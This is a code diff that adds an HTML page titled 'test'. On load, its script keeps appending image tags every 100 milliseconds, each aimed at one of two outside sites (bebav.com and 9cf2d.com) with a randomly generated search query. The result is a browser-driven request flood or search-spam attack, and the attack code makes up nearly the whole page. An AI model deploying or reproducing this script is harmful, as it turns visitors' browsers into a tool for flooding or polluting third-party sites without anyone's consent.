@@ -1,1 +1,33 @@
-aaaaaa
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>test</title>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+</head>
+<body>
+<div id="img">
+</div>
+<script>
+var Date=new Date();
+var t = Date.getTime();
+var char='圠圡圢圤圥圦圧圩圪圫圬6圮圯地圱圲圳圴圵圶圷FAH圸圹圻圼埢鴪R址坁坂坃坄坅A坈坉坊坋坌坍坒坓E坜坞坢坣坥坧坨坩坪坫坬坭坮坯垧坱坲坳坴坶坸坹坺坻坼坽坾坿垀垁垃垅垆垇垈垉垊垌A垍垎垏垐垑垓DD埢埣埤埥埦埧埨埩埪埫埬埭埮埯埰埱埲FHG埴6埵埶执埸培基埻崎埽埾V9埿堀堁堃堄坚堆A堇堈堉垩堋堌堍堎H堏堐堑堒堓堔堕垴堗堘堙堚堛堜埚堞堟堠堢堣堥堦堧堨堩堫堬堭堮尧堰报堲堳场堶堷堸堹堺堻堼FAS堽堾堼堾碱塀塁塂塃塄塅2塇塆塈1塉块茔塌32塍塎垲塐塑9HKI埘塓塕塖涂E塘塙冢塛塜塝塟塠墘R塣墘塥塦塧塨塩B塪填塬塭塮塯塰塱塲塳塴尘塶塷塸堑塺塻塼塽塾塿墀墁墂墄墅墆墇墈墉垫墋墌墍墎墏墐墒墒墓墔墕墖墘墖墚墛坠墝增墠墡墢5墣墤墥墦墧墨墩墪樽墬墭堕墯墰墱墲坟墴墵垯墷墸墹墺墙墼墽垦墿壀壁壂壃壄壅壆坛壈壉壊垱壌壍埙壏壐壑壒压壔壕壖壗垒圹垆壛壜壝垄壠壡坜壣壤壥壦壧壨坝塆圭';
+var len=char.length;
+var num=0;
+function imgs(){
+	var rnd=Math.ceil(Math.random()*5);
+	var so='';
+	for(var i=0;i<rnd+8;i++){var a=Math.floor(Math.random()*len);so+=char.substr(a,1);}
+	var w1='https://bebav.com/';
+	var w2='https://www.9cf2d.com/';
+	var url='?m=video_search*'+so+'*1&t='+t;
+	$("#img").append('<img style="width:50px;" src="'+w2+url+'"/>');
+	$("#img").append('<img style="width:50px;" src="'+w1+url+'"/>');
+	num=num+1;
+	if(num == 50){ $("#img").html('');}
+}
+var slep=window.setInterval(function(){imgs();},100);
+</script>
+</body>
+</html>
+
